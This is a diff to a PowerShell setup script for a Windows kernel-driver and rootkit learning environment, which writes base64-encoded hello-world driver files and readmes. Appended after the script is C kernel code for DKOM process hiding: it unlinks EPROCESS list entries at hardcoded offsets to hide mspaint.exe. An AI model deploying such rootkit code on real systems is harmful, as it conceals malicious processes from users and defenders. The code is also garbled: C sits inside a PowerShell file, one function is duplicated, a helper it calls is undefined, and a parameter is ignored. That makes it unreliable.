@@ -5,7 +5,7 @@ function Show-Menu {
     Write-Host "1. Requirements -> Visual Studio 2022 Community + SDK + WDK"
     Write-Host "2. Set Up Environment -> Debugging and Signing Mode"
     Write-Host "3. Debug -> WinDbg Preview"
-    Write-Host "4. Tools -> Microsoft Sysinternals Suite"
+    Write-Host "4. Tools -> Microsoft Sysinternals Suite + OSR Driver Loader"
     Write-Host "5. Kernel-Mode Driver -> Hello World"
     Write-Host "Q. Exit"
     Write-Host "============"
@@ -112,7 +112,7 @@ function OptionEnvironmentDebuggingAndRootkits {
 
 function OptionTools {
 
-    Write-Host "You have selected the option 'Tools -> Microsoft Sysinternals Suite'" -ForegroundColor Green
+    Write-Host "You have selected the option 'Tools -> Microsoft Sysinternals Suite + OSR Driver Loader'" -ForegroundColor Green
 	$response = Read-Host "Do you want to proceed? (Press 'Y')"
 	if ($response -eq "Y") {
 
@@ -130,9 +130,26 @@ function OptionTools {
                 Expand-Archive -Path $folderToolsPath\master.zip -DestinationPath $folderToolsPath\SysinternalsSuite
                 Remove-Item $folderToolsPath\master.zip
 			} else {
-				Write-Host "The folder '$folderToolsPath' already exists in this directory. Unable to proceed." -ForegroundColor Red
+				Write-Host "The folder '$folderToolsPath\SysinternalsSuite' already exists in this directory. Unable to proceed." -ForegroundColor Red
 			}
 		}
+
+        $install = Read-Host "Do you want to download OSR Driver Loader? (Y/N)"
+		if ($install -eq "Y") {
+			if (-not (Test-Path -Path $folderToolsPath\OSRDriverLoader)) {
+
+                Write-Host "Downloading Microsoft Sysinternals Suite" -ForegroundColor Magenta
+
+                Invoke-WebRequest -Uri "https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip" -OutFile $folderToolsPath\master.zip
+                Expand-Archive -Path $folderToolsPath\master.zip -DestinationPath $folderToolsPath\OSRDriverLoader
+                Remove-Item $folderToolsPath\master.zip
+			} else {
+				Write-Host "The folder '$folderToolsPath\OSRDriverLoader' already exists in this directory. Unable to proceed." -ForegroundColor Red
+			}
+		}
+
+
+        
     }
 }
 
@@ -145,24 +162,62 @@ function OptionKernelModeDriverHellowWorld {
 	if ($response -eq "Y") {
         Write-Host "Creating files" -ForegroundColor Magenta
 
-		$folderDriverHello = "KernelModeDriverHelloWorld"
+		$folderDriverHello = "KMDF1DriverHelloWorld"
 		$folderDriverHelloPath = Join-Path -Path $PWD -ChildPath $folderDriverHello
 		New-Item -ItemType Directory -Path $folderDriverHelloPath | Out-Null
 
-		$contentDrivercHello = "I2luY2x1ZGUgPG50ZGRrLmg+CgoKVk9JRCBEcml2ZXJVbmxvYWQoX0luXyBQRFJJVkVSX09CSkVDVCBEcml2ZXJPYmplY3QpCnsKICAgIFVOUkVGRVJFTkNFRF9QQVJBTUVURVIoRHJpdmVyT2JqZWN0KTsKCiAgICBEYmdQcmludCgiUm9vdGtpdCBQT0MgZGVzY2FyZ2FuZG8uLi4gU2UgaGEgcGFyYWRvIGVsIHNlcnZpY2lvIik7Cn0KCgpOVFNUQVRVUyBEcml2ZXJFbnRyeShfSW5fIFBEUklWRVJfT0JKRUNUIERyaXZlck9iamVjdCwgX0luXyBQVU5JQ09ERV9TVFJJTkcgUmVnaXN0cnlQYXRoKQp7CiAgICBVTlJFRkVSRU5DRURfUEFSQU1FVEVSKFJlZ2lzdHJ5UGF0aCk7CgogICAgRHJpdmVyT2JqZWN0LT5Ecml2ZXJVbmxvYWQgPSBEcml2ZXJVbmxvYWQ7CgogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DIG5vcyBzYWx1ZGE6IEhvbGEgbXVuZG8hISEiKTsKCiAgICByZXR1cm4gU1RBVFVTX1NVQ0NFU1M7Cn0K"
-		$helloDrivercBytes = [System.Convert]::FromBase64String($contentDrivercHello)
-		[System.IO.File]::WriteAllBytes("$folderDriverHelloPath\Driver.c", $helloDrivercBytes)
-		
-		$contentDrivercExplainHello = "LyoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vIE5vbWJyZTogS01ERiBEcml2ZXIgMSBIb2xhIE11bmRvCi8vIFByb3llY3RvIGVuIFZpc3VhbCBTdHVkaW86IFBsYW50aWxsYSAtPiBLZXJuZWwgTW9kZSBEcml2ZXIsIEVtcHR5IChLTURGKQovLyBDw7NkaWdvIEZ1ZW50ZToKCgovLyBMaWJyZXLDrWEgcHJpbmNpcGFsIHF1ZSBpbmNsdXllIGxhcyBkZWZpbmljaW9uZXMgbmVjZXNhcmlhcyBwYXJhIGVsIGRlc2Fycm9sbG8gZGUgZHJpdmVycwojaW5jbHVkZSA8bnRkZGsuaD4KCgovLyBGdW5jacOzbiBkZSBzYWxpZGEsIGVqZWN1dGFkYSBjdWFuZG8gZWwgZHJpdmVyIHNlICJkZXNjYXJnYSIgKGN1YW5kbyBzZSBwYXJlIGVsIHNlcnZpY2lvKQpWT0lEIERyaXZlclVubG9hZCgKICAgIC8vIFB1bnRlcm8gYSB1bmEgZXN0cnVjdHVyYSBEUklWRVJfT0JKRUNUIHF1ZSByZXByZXNlbnRhIGxhIHByb3BpYSBpbWFnZW4gZGVsIGRyaXZlciBlbiBlbCBrZXJuZWwgZGVsIHNpc3RlbWEgb3BlcmF0aXZvCiAgICBfSW5fIFBEUklWRVJfT0JKRUNUICAgICBEcml2ZXJPYmplY3QKKQp7CiAgICAvLyBTZSBldml0YSBsYSBhZHZlcnRlbmNpYSBkZSAicGFyw6FtZXRybyBEcml2ZXJPYmplY3Qgbm8gdXRpbGl6YWRvIgogICAgVU5SRUZFUkVOQ0VEX1BBUkFNRVRFUihEcml2ZXJPYmplY3QpOwogICAgCiAgICAvLyBTZSBpbXByaW1lIHVuYSBjYWRlbmEgZGUgdGV4dG8gY3VhbmRvIHNlIHBhcmEgZWwgc2VydmljaW8KICAgIERiZ1ByaW50KCJSb290a2l0IFBPQyBkZXNjYXJnYW5kby4uLiBTZSBoYSBwYXJhZG8gZWwgc2VydmljaW8iKTsKfQoKCi8vIFB1bnRvIGRlIGVudHJhZGEgZGUgdW4gZHJpdmVyIGVuIGVsIG1vZG8ga2VybmVsIGRlIFdpbmRvd3MsIGVzIGNvbW8gdW4gbWFpbiBlbiBjIG8gcHl0aG9uCk5UU1RBVFVTIERyaXZlckVudHJ5KAogICAgLy8gUHVudGVybyBhIHVuYSBlc3RydWN0dXJhIERSSVZFUl9PQkpFQ1QgcXVlIHJlcHJlc2VudGEgbGEgcHJvcGlhIGltYWdlbiBkZWwgZHJpdmVyIGVuIGVsIGtlcm5lbCBkZWwgc2lzdGVtYSBvcGVyYXRpdm8KICAgIF9Jbl8gUERSSVZFUl9PQkpFQ1QgICAgIERyaXZlck9iamVjdCwKICAgIC8vIFB1bnRlcm8gYSB1bmEgZXN0cnVjdHVyYSBVTklDT0RFX1NUUklORywgcXVlIGNvbnRpZW5lIGxhIHJ1dGEgZGVsIHJlZ2lzdHJvIGRlbCBkcml2ZXIgY29tbyB1bmEgY2FkZW5hIGRlIGNhcmFjdGVyZXMgdW5pY29kZSwgZW4gbGEgcXVlIHNlIGluZGljYSBsYSBsb2NhbGl6YWNpw7NuIGRlbCBkcml2ZXIgZW4gZWwgcmVnaXN0cm8gZGUgV2luZG93cwogICAgX0luXyBQVU5JQ09ERV9TVFJJTkcgICAgUmVnaXN0cnlQYXRoCikKewogICAgLy8gU2UgZXZpdGEgbGEgYWR2ZXJ0ZW5jaWEgZGUgInBhcsOhbWV0cm8gUmVnaXN0cnlQYXRoIG5vIHV0aWxpemFkbyIKICAgIFVOUkVGRVJFTkNFRF9QQVJBTUVURVIoUmVnaXN0cnlQYXRoKTsKICAgIAogICAgLy8gU2UgZXN0YWJsZWNlIGxhIHJ1dGluYSBkZSBzYWxpZGEKICAgIERyaXZlck9iamVjdC0+RHJpdmVyVW5sb2FkID0gRHJpdmVyVW5sb2FkOwoKICAgIC8vIFNlIGltcHJpbWUgdW5hIGNhZGVuYSBkZSB0ZXh0byBwYXJhIGluZGljYXIgcXVlIGVsIGRyaXZlciBzZSBoYSBjYXJnYWRvCiAgICBEYmdQcmludCgiUm9vdGtpdCBQT0Mgbm9zIHNhbHVkYTogSG9sYSBtdW5kbyEhISIpOwoKICAgIC8vIEluZGljYSBxdWUgZWwgZHJpdmVyIHNlIGhhIGluaWNpYWRvIGNvcnJlY3RhbWVudGUKICAgIHJldHVybiBTVEFUVVNfU1VDQ0VTUzsKfQoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KKi8="
-		$helloDrivercExplainBytes = [System.Convert]::FromBase64String($contentDrivercExplainHello)
-		[System.IO.File]::WriteAllBytes("$folderDriverHelloPath\DriverExplicado.c", $helloDrivercExplainBytes)
-		
-		$contentExecuteHello = "CkPDs21vIHByb2JhciBlbCBkcml2ZXI6CgoxICAgLSBDb21waWxhciAtPiBDb21waWxhciBzb2x1Y2nDs24KCjIgICAtIEFicmlyIERlYnVnVmlldyBjb21vIGFkbWluaXN0cmFkb3IKMi4xIC0gTWFyY2FyIGxhcyBvcGNpb25lczogQ2FwdHVyZSAtPiBDYXB0dXJlIEtlcm5lbCB5IENhcHR1cmUgLT4gRW5hYmxlIFZlcmJvc2UgS2VybmVsIE91dHB1dAoKMyAgIC0gQWJyaXIgcG93ZXJzaGVsbCBjb21vIGFkbWluaXN0cmFkb3IKMy4xIC0gLlxzYy5leGUgc3RvcCBLTURGRHJpdmVyMUhvbGFNdW5kbwozLjIgLSAuXHNjLmV4ZSBkZWxldGUgS01ERkRyaXZlcjFIb2xhTXVuZG8KMy4zIC0gLlxzYy5leGUgY3JlYXRlIEtNREZEcml2ZXIxSG9sYU11bmRvIHR5cGU9IGtlcm5lbCBzdGFydD0gZGVtYW5kIGJpbnBhdGg9IkM6XFVzZXJzXHJldnk2NFxTb3VyY2VcUmVwb3NcS01ERiBEcml2ZXIxIEhvbGEgTXVuZG9ceDY0XERlYnVnXEtNREZEcml2ZXIxSG9sYU11bmRvLnN5cyIKMy40IC0gLlxzYy5leGUgc3RhcnQgS01ERkRyaXZlcjFIb2xhTXVuZG8KCjQgICAtIE9ic2VydmFyIG1lbnNhamVzIGVuIERldnVnVmlldwo="
-		$helloExecuteBytes = [System.Convert]::FromBase64String($contentExecuteHello)
-		[System.IO.File]::WriteAllBytes("$folderDriverHelloPath\Ejecucion.txt", $helloExecuteBytes)
+        $folderDriverHelloDirDriver = "Driver"
+        $folderDriverDirDriverPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirDriver
+        New-Item -ItemType Directory -Path $folderDriverDirDriverPath | Out-Null
+
+		$contentDrivercHello = "I2luY2x1ZGUgPG50ZGRrLmg+CgoKVk9JRCBEcml2ZXJVbmxvYWQoX0luXyBQRFJJVkVSX09CSkVDVCBwRHJpdmVyT2JqZWN0KQp7CiAgICBVTlJFRkVSRU5DRURfUEFSQU1FVEVSKHBEcml2ZXJPYmplY3QpOwoKICAgIERiZ1ByaW50KCJSb290a2l0IFBPQzogVW5sb2FkaW5nLi4uIFNlcnZpY2UgaGFzIHN0b3BwZWQiKTsKfQoKCk5UU1RBVFVTIERyaXZlckVudHJ5KF9Jbl8gUERSSVZFUl9PQkpFQ1QgcERyaXZlck9iamVjdCwgX0luXyBQVU5JQ09ERV9TVFJJTkcgcFJlZ2lzdHJ5UGF0aCkKewogICAgVU5SRUZFUkVOQ0VEX1BBUkFNRVRFUihwUmVnaXN0cnlQYXRoKTsKCiAgICBwRHJpdmVyT2JqZWN0LT5Ecml2ZXJVbmxvYWQgPSBEcml2ZXJVbmxvYWQ7CgogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBMb2FkaW5nLi4uIEhlbGxvIFdvcmxkIik7CgogICAgcmV0dXJuIFNUQVRVU19TVUNDRVNTOwp9Cg=="
+		$contentDrivercHelloDecode = [System.Convert]::FromBase64String($contentDrivercHello)
+		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\1DriverHelloWorld.c", $contentDrivercHelloDecode)
+
+		$contentDrivercHelloComments = "LyoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vIE5hbWU6IEtNREYxRHJpdmVySGVsbG9Xb3JsZAovLyBWaXN1YWwgU3R1ZGlvIFByb2plY3Q6IFRlbXBsYXRlIC0+IEtlcm5lbCBNb2RlIERyaXZlciwgRW1wdHkgKEtNREYpCi8vIFNvdXJjZSBDb2RlOgovLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2dldHRpbmdzdGFydGVkL3dyaXRpbmctYS12ZXJ5LXNtYWxsLWttZGYtLWRyaXZlcgoKLy8gTWFpbiBsaWJyYXJ5IGluY2x1ZGluZyB0aGUgbmVjZXNzYXJ5IGRlZmluaXRpb25zIGZvciBkcml2ZXIgZGV2ZWxvcG1lbnQKLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvbnRkZGsvCiNpbmNsdWRlIDxudGRkay5oPgoKLy8gVW5sb2FkIGZ1bmN0aW9uLCBleGVjdXRlZCB3aGVuIHRoZSBkcml2ZXIgc3RvcHMKLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25jLXdkbS1kcml2ZXJfdW5sb2FkClZPSUQgRHJpdmVyVW5sb2FkKAogICAgLy8gUG9pbnRlciB0byBhIERSSVZFUl9PQkpFQ1Qgc3RydWN0dXJlIHJlcHJlc2VudGluZyB0aGUgZHJpdmVyJ3MgaW1hZ2UgaW4gdGhlIG9wZXJhdGluZyBzeXN0ZW0ga2VybmVsCgkvLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2RkaS93ZG0vbnMtd2RtLV9kcml2ZXJfb2JqZWN0CiAgICBfSW5fIFBEUklWRVJfT0JKRUNUICAgICBwRHJpdmVyT2JqZWN0CikKewogICAgLy8gUHJldmVudGluZyBjb21waWxlciB3YXJuaW5ncyBmb3IgdW51c2VkIHBEcml2ZXJPYmplY3QgcGFyYW1ldGVyCiAgICBVTlJFRkVSRU5DRURfUEFSQU1FVEVSKHBEcml2ZXJPYmplY3QpOwogICAgCiAgICAvLyBQcmludGluZyBhIG1lc3NhZ2Ugd2hlbiB0aGUgc2VydmljZSBzdG9wcwoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25mLXdkbS1kYmdwcmludAogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBVbmxvYWRpbmcuLi4gU2VydmljZSBoYXMgc3RvcHBlZCIpOwp9CgovLyBFbnRyeSBwb2ludCBmb3IgYSBXaW5kb3dzIGtlcm5lbCBtb2RlIGRyaXZlciwgYWtpbiB0byAnbWFpbicgaW4gQyBvciBQeXRob24KLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy93ZGYvZHJpdmVyZW50cnktZm9yLWttZGYtZHJpdmVycwpOVFNUQVRVUyBEcml2ZXJFbnRyeSgKICAgIC8vIFBvaW50ZXIgdG8gYSBEUklWRVJfT0JKRUNUIHN0cnVjdHVyZSByZXByZXNlbnRpbmcgdGhlIGRyaXZlcidzIGltYWdlIGluIHRoZSBvcGVyYXRpbmcgc3lzdGVtIGtlcm5lbAoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25zLXdkbS1fZHJpdmVyX29iamVjdAogICAgX0luXyBQRFJJVkVSX09CSkVDVCAgICAgcERyaXZlck9iamVjdCwKICAgIC8vIFBvaW50ZXIgdG8gYSBVTklDT0RFX1NUUklORyBzdHJ1Y3R1cmUsIGNvbnRhaW5pbmcgdGhlIGRyaXZlcidzIHJlZ2lzdHJ5IHBhdGggYXMgYSBVbmljb2RlIHN0cmluZywgaW5kaWNhdGluZyB0aGUgZHJpdmVyJ3MgbG9jYXRpb24gaW4gdGhlIFdpbmRvd3MgcmVnaXN0cnkKCS8vIGh0dHBzOi8vbGVhcm4ubWljcm9zb2Z0LmNvbS9lbi11cy93aW5kb3dzL3dpbjMyL2FwaS9udGRlZi9ucy1udGRlZi1fdW5pY29kZV9zdHJpbmcKICAgIF9Jbl8gUFVOSUNPREVfU1RSSU5HICAgIHBSZWdpc3RyeVBhdGgKKQp7CiAgICAvLyBQcmV2ZW50aW5nIGNvbXBpbGVyIHdhcm5pbmdzIGZvciB1bnVzZWQgcFJlZ2lzdHJ5UGF0aCBwYXJhbWV0ZXIKICAgIFVOUkVGRVJFTkNFRF9QQVJBTUVURVIocFJlZ2lzdHJ5UGF0aCk7CiAgICAKICAgIC8vIFNldHRpbmcgdGhlIHVubG9hZCByb3V0aW5lCgkvLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2RkaS93ZG0vbmMtd2RtLWRyaXZlcl91bmxvYWQKICAgIHBEcml2ZXJPYmplY3QtPkRyaXZlclVubG9hZCA9IERyaXZlclVubG9hZDsKCiAgICAvLyBQcmludGluZyBhIG1lc3NhZ2UgdG8gaW5kaWNhdGUgdGhhdCB0aGUgZHJpdmVyIGhhcyBiZWVuIGxvYWRlZAoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25mLXdkbS1kYmdwcmludAogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBMb2FkaW5nLi4uIEhlbGxvIFdvcmxkIik7CgogICAgLy8gU3VjY2Vzc2Z1bCBkcml2ZXIgaW5pdGlhbGl6YXRpb24KICAgIHJldHVybiBTVEFUVVNfU1VDQ0VTUzsKfQoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KKi8K"
+		$contentDrivercHelloCommentsDecode = [System.Convert]::FromBase64String($contentDrivercHelloComments)
+		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\2DriverHelloWorldComments.c", $contentDrivercHelloCommentsDecode)
+
+		$contentDrivercHelloReadme = "IyMjIEhvdyB0byBUZXN0IHRoZSBEcml2ZXIKCjEuIEJ1aWxkIHRoZSBTb2x1dGlvbjoKICAgIC0gQnVpbGQgLT4gQnVpbGQgU29sdXRpb24KCjIuIE9wZW4gRGVidWdWaWV3IGFzIGFuIEFkbWluaXN0cmF0b3I6CiAgICAtIEVuYWJsZSBvcHRpb25zICgiQ2FwdHVyZSAtPiBDYXB0dXJlIEtlcm5lbCIgYW5kICJDYXB0dXJlIC0+IEVuYWJsZSBWZXJib3NlIEtlcm5lbCBPdXRwdXQiKQoKMy4gT3BlbiBQb3dlclNoZWxsIGFzIGFuIEFkbWluaXN0cmF0b3IgYW5kIHJ1biB0aGUgZm9sbG93aW5nIGNvbW1hbmRzOgogICAgLSAuXHNjLmV4ZSBzdG9wIEtNREYxRHJpdmVySGVsbG9Xb3JsZAogICAgLSAuXHNjLmV4ZSBkZWxldGUgS01ERjFEcml2ZXJIZWxsb1dvcmxkCiAgICAtIC5cc2MuZXhlIGNyZWF0ZSBLTURGMURyaXZlckhlbGxvV29ybGQgdHlwZT1rZXJuZWwgc3RhcnQ9ZGVtYW5kIGJpbnBhdGg9IkM6XFVzZXJzXHVzZXIxXFNvdXJjZVxSZXBvc1xLTURGMURyaXZlckhlbGxvV29ybGRceDY0XERlYnVnXEtNREYxRHJpdmVySGVsbG9Xb3JsZC5zeXMiCiAgICAtIC5cc2MuZXhlIHN0YXJ0IEtNREYxRHJpdmVySGVsbG9Xb3JsZAoKNC4gT2JzZXJ2ZSBNZXNzYWdlcyBpbiBEZWJ1Z1ZpZXc6CiAgICAtIE1vbml0b3IgdGhlIG91dHB1dCBpbiBEZWJ1Z1ZpZXcgZm9yIGFueSBkcml2ZXIgbWVzc2FnZXMuCg=="
+		$contentDrivercHelloReadmeDecode = [System.Convert]::FromBase64String($contentDrivercHelloReadme)
+		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\3DriverHelloWorldReadme.md", $contentDrivercHelloReadmeDecode)
     }
 }
 
+
+function OptionKernelModeDriverHelloWorldCommunication {
+
+    Write-Host "You have selected the option 'Kernel-Mode Driver -> Hello World Communication'" -ForegroundColor Green
+	$response = Read-Host "Do you want to proceed? (Press 'Y')"
+	if ($response -eq "Y") {
+        Write-Host "Creating files" -ForegroundColor Magenta
+
+		$folderDriverHello = "KMDF2DriverHelloWorldCommunication"
+		$folderDriverHelloPath = Join-Path -Path $PWD -ChildPath $folderDriverHello
+		New-Item -ItemType Directory -Path $folderDriverHelloPath | Out-Null
+
+        $folderDriverHelloDirApplication = "Application"
+        $folderDriverDirApplicationPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirApplication
+        New-Item -ItemType Directory -Path $folderDriverDirApplicationPath | Out-Null
+
+        $folderDriverHelloDirDriver = "Driver"
+        $folderDriverDirDriverPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirDriver
+        New-Item -ItemType Directory -Path $folderDriverDirDriverPath | Out-Null
+
+		$contentDrivercHello = ""
+		$helloDrivercBytes = [System.Convert]::FromBase64String($contentDrivercHello)
+		[System.IO.File]::WriteAllBytes("$folderDriverDirApplicationPath\1ApplicationHelloWorldCommunication.c", $helloDrivercBytes)
+
+        $contentUsercHello = ""
+		$helloUsercBytes = [System.Convert]::FromBase64String($contentUsercHello)
+		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\1DriverHelloWorldCommunication.c", $helloUsercBytes)
+		
+		
+		$contentDrivercHelloReadme = "IyMjIEhvdyB0byBUZXN0IHRoZSBEcml2ZXIKCjEuIEJ1aWxkIHRoZSBTb2x1dGlvbjoKICAgIC0gQnVpbGQgLT4gQnVpbGQgU29sdXRpb24KCjIuIE9wZW4gRGVidWdWaWV3IGFzIGFuIEFkbWluaXN0cmF0b3I6CiAgICAtIEVuYWJsZSBvcHRpb25zIChDYXB0dXJlIC0+IENhcHR1cmUgS2VybmVsIGFuZCBDYXB0dXJlIC0+IEVuYWJsZSBWZXJib3NlIEtlcm5lbCBPdXRwdXQpCgozLiBPcGVuIFBvd2VyU2hlbGwgYXMgYW4gQWRtaW5pc3RyYXRvciBhbmQgcnVuIHRoZSBmb2xsb3dpbmcgY29tbWFuZHM6CiAgICAtIC5cc2MuZXhlIHN0b3AgS01ERkRyaXZlcjFIZWxsb1dvcmxkCiAgICAtIC5cc2MuZXhlIGRlbGV0ZSBLTURGRHJpdmVyMUhlbGxvV29ybGQKICAgIC0gLlxzYy5leGUgY3JlYXRlIEtNREZEcml2ZXIxSGVsbG9Xb3JsZCB0eXBlPWtlcm5lbCBzdGFydD1kZW1hbmQgYmlucGF0aD0iQzpcVXNlcnNcdXNlcjFcU291cmNlXFJlcG9zXEtNREZEcml2ZXIxSGVsbG9Xb3JsZFx4NjRcRGVidWdcS01ERkRyaXZlcjFIZWxsb1dvcmxkLnN5cyIKICAgIC0gLlxzYy5leGUgc3RhcnQgS01ERkRyaXZlcjFIZWxsb1dvcmxkCgo0LiBPYnNlcnZlIE1lc3NhZ2VzIGluIERlYnVnVmlldzoKICAgIC0gTW9uaXRvciB0aGUgb3V0cHV0IGluIERlYnVnVmlldyBmb3IgYW55IGRyaXZlciBtZXNzYWdlcy4K"
+		$helloExecuteBytes = [System.Convert]::FromBase64String($contentDrivercHelloReadme)
+		[System.IO.File]::WriteAllBytes("$folderDriverHelloPath\DriverUserHelloWorldReadme.md", $helloExecuteBytes)
+    }
+}
 
 
 do {
@@ -180,3 +235,128 @@ do {
     Write-Host "Press any key to continue..."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 } while ($choice -ne 'Q')
+
+
+
+
+
+VOID AvoidBSOD_RemoveProcessLinks(
+PLIST_ENTRY CurrListEntry
+)
+{
+    PLIST_ENTRY Previous, Next;
+    Previous = (CurrListEntry->Blink);
+    Next = (CurrListEntry->Flink);
+
+	DbgPrint("AvoidBSOD_RemoveProcessLinks -> Remove entry list");
+    Previous->Flink = Next;
+    Next->Blink = Previous;
+
+	DbgPrint("AvoidBSOD_RemoveProcessLinks -> Re-write the current LIST_ENTRY to point to itself (A way to avoid BSOD)");
+    CurrListEntry->Blink = (PLIST_ENTRY)&CurrListEntry->Flink;
+    CurrListEntry->Flink = (PLIST_ENTRY)&CurrListEntry->Flink;
+    return;
+}
+
+
+VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
+    _In_ UINT32 pid
+)
+{
+    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;
+
+    UINT32* currUniqueProcessId = NULL;
+    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;
+
+    PEPROCESS CurrentProcess = PsGetCurrentProcess();
+
+    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
+    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
+    PLIST_ENTRY NextListEntry = NULL;
+
+    while (CurrListEntry != PrevListEntry)
+    {
+        NextListEntry = CurrListEntry->Flink;
+        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);
+
+        if (*(UINT32*)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
+        {
+            DbgPrint("Hide Process: Pid (%p)", currUniqueProcessId);
+            RemoveTheLinks(CurrListEntry);
+        }
+
+        CurrListEntry = NextListEntry;
+    }
+}
+
+
+VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
+    _In_ char* ProcessName
+)
+{
+    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;
+
+    char* currImageFileName = NULL;
+    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;
+
+    UINT32* currUniqueProcessId = NULL;
+    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;
+
+    PEPROCESS CurrentProcess = PsGetCurrentProcess();
+
+    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
+    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
+    PLIST_ENTRY NextListEntry = NULL;
+
+    while (CurrListEntry != PrevListEntry)
+    {
+        NextListEntry = CurrListEntry->Flink;
+        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
+        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);
+
+        if (strcmp(currImageFileName, "mspaint.exe") == 0 && MmIsAddressValid(CurrListEntry))
+        {
+            DbgPrint("Hide Process: Name (%s), PID (%p)", currImageFileName, currUniqueProcessId);
+            RemoveEntryList(CurrListEntry);
+        }
+
+        CurrListEntry = NextListEntry;
+    }
+}
+
+VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
+    _In_ char* ProcessName
+)
+{
+    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;
+
+    char* currImageFileName = NULL;
+    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;
+
+    UINT32* currUniqueProcessId = NULL;
+    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;
+
+    PEPROCESS CurrentProcess = PsGetCurrentProcess();
+
+    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
+    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
+    PLIST_ENTRY NextListEntry = NULL;
+
+    while (CurrListEntry != PrevListEntry)
+    {
+        NextListEntry = CurrListEntry->Flink;
+        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
+        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);
+
+        if (strcmp(currImageFileName, "mspaint.exe") == 0 && MmIsAddressValid(CurrListEntry))
+        {
+            DbgPrint("Hide Process: Name (%s), PID (%p)", currImageFileName, currUniqueProcessId);
+            RemoveEntryList(CurrListEntry);
+        }
+
+        CurrListEntry = NextListEntry;
+    }
+}
+
+
+
